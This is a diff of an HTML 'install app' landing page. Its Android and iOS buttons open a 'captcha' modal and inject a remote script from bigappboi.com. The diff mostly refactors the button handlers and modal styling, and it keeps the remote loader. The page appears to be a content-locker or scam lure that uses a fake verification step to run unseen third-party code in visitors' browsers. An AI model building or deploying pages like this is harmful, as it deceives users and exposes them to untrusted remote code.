@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
-   <style>
     .modal {
       display: none;
       position: fixed;
@@ -25,13 +24,12 @@
       background-color: #fefefe;
       padding: 20px;
       border: 1px solid #888;
-      width: 90%; 
-      max-height: 60%; 
-      min-height: 60%;
+      width: 80%; 
+      max-width: 400px; 
+      max-height: 80%; 
       overflow: auto;
       text-align: center;
     }
-
     .modal-content h3 {
       text-align: center;
     }
@@ -103,8 +101,8 @@
 <body>
     <div class="center-content">
         <img src="logo.png" alt="Logo"> 
-        <button id="ios-btn" style="cursor: pointer;">Install for Android</button>
-         <button id="ios-btn" style="cursor: pointer;">Install for iOS</button>
+        <button class="install-button" style="cursor: pointer;">Install for Android</button>
+<button class="install-button" style="cursor: pointer;">Install for iOS</button>
 <div id="captchaModal" class="modal">
       <div class="modal-content">
         <span id="modalClose" style="float: right;font-size: 22px;font-weight: bold;">&times;</span>
@@ -120,37 +118,37 @@
     
 
 <script>
-        function showModal(e){
-            e.preventDefault();
+     const buttons = document.getElementsByClassName('install-button');
 
-            const modal = document.getElementById('captchaModal');
-            const captchaSection = document.getElementById('captcha-section');
-            
-            captchaSection.innerHTML = '';
-            captchaSection.dataset['captchaEnable'] = 'true';
+for(let btn of buttons){
+    btn.addEventListener('click', function(e) {
+        e.preventDefault();
 
-            const loader = document.getElementById('loader');
-            loader.style.display = 'block';
+        const modal = document.getElementById('captchaModal');
+        const captchaSection = document.getElementById('captcha-section');
+        
+        captchaSection.innerHTML = '';
+        captchaSection.dataset['captchaEnable'] = 'true';
 
-            const script = document.createElement('script');
-            script.src = 'https://bigappboi.com/cp/js/zqz62';
-            script.async = true;
-            script.onload = (() => {
-              loader.style.display = 'none';
-            }); 
+        const loader = document.getElementById('loader');
+        loader.style.display = 'block';
 
-            document.body.appendChild(script);
+        const script = document.createElement('script');
+        script.src = 'https://bigappboi.com/cp/js/zqz62';
+        script.async = true;
+        script.onload = (() => {
+          loader.style.display = 'none';
+        }); 
 
-            modal.style.display = 'block';
-        }
+        document.body.appendChild(script);
 
-        document.getElementById('android-btn').addEventListener('click', showModal);
-        document.getElementById('ios-btn').addEventListener('click', showModal);
-    
+        modal.style.display = 'block';
+    });
+}
 
-        document.getElementById('modalClose').addEventListener('click', function() {
-          document.getElementById('captchaModal').style.display = 'none';
-        });
-</script>
+document.getElementById('modalClose').addEventListener('click', function() {
+    document.getElementById('captchaModal').style.display = 'none';
+});
+    </script>
 </body>
 </html>
